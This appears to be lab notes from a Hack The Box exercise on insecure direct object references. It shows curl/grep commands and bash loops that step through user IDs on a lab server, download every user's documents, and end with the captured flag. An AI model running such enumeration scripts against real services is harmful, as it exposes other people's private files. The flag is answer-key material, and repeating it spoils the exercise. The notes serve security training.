# Mass IDOR Enumeration

## Insecure Parameters

http://SERVER_IP:PORT/documents.php?uid=1

/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf

Files have apredictable name
Fuzz files for other users

--> Static file IDOR

## Mass Enumeration

Burp Intruder
uid=3
...

- Identifying the tags around the files :

<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>

curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"

<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>

- Add filter to only get the files

curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf

- Use bash to download all documents

#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done

## LAB

83.136.250.104:30155

POST /documents.php HTTP/1.1
Host: 83.136.250.104:30155
Content-Length: 5
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://83.136.250.104:30155
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://83.136.250.104:30155/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

uid=1

     <ul class="pure-tree">
        <li class='pure-tree_link'><a href='/documents/Invoice_1_09_2021.pdf' target='_blank'>Invoice</a></li><li class='pure-tree_link'><a href='/documents/Report_1_10_2021.pdf' target='_blank'>Report</a></li>


#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done

curl -d "uid=1" -X POST http://83.136.250.104:30155/documents.php
        <li class='pure-tree_link'><a href='/documents/Invoice_1_09_2021.pdf' target='_blank'>Invoice</a></li><li class='pure-tree_link'><a href='/documents/Report_1_10_2021.pdf' target='_blank'>Report</a></li>      </ul>
    </li>

curl -d "uid=1" -X POST http://83.136.250.104:30155/documents.php | grep -oP "\/documents.*?.pdf"
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf


curl -d "uid=1" -X POST http://83.136.250.104:30155/documents.php | grep -oP "\/documents.*?.txt"

 % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   868  100   863  100     5   131k    780 --:--:-- --:--:-- --:--:--  141k



#!/bin/bash

url="http://83.136.250.104:30155"

for i in {1..20}; do
        for link in $(curl -d "uid=$i" -X POST $url/documents.php | grep -oP "\/documents.*?"); do
                wget -q $url/$link
        done
done


#!/bin/bash

url="http://83.136.250.104:30155"

for i in {1..20}; do
        for link in $(curl -d "uid=$i" -X POST $url/documents.php | grep -oP "\/documents.*?.txt"); do
                echo $url/$link
        done
done

http://83.136.250.104:30155//documents/Invoice_15_11_2020.pdf'
http://83.136.250.104:30155/target='_blank'>Invoice</a></li><li
http://83.136.250.104:30155/class='pure-tree_link'><a
http://83.136.250.104:30155/href='/documents/Report_15_01_2020.pdf'
http://83.136.250.104:30155/target='_blank'>Report</a></li><li
http://83.136.250.104:30155/class='pure-tree_link'><a
http://83.136.250.104:30155/href='/documents/flag_11dfa168ac8eb2958e38425728623c98.txt

#!/bin/bash

url="http://83.136.250.104:30155"

for i in {1..20}; do
        for link in $(curl -d "uid=$i" -X POST $url/documents.php | grep -oP "\/documents.*?.txt"); do
                wget -q $url/$link
        done
done

wget -q http://83.136.250.104:30155/documents/flag_11dfa168ac8eb2958e38425728623c98.txt

cat flag_11dfa168ac8eb2958e38425728623c98.txt 
HTB{4ll_f1l35_4r3_m1n3}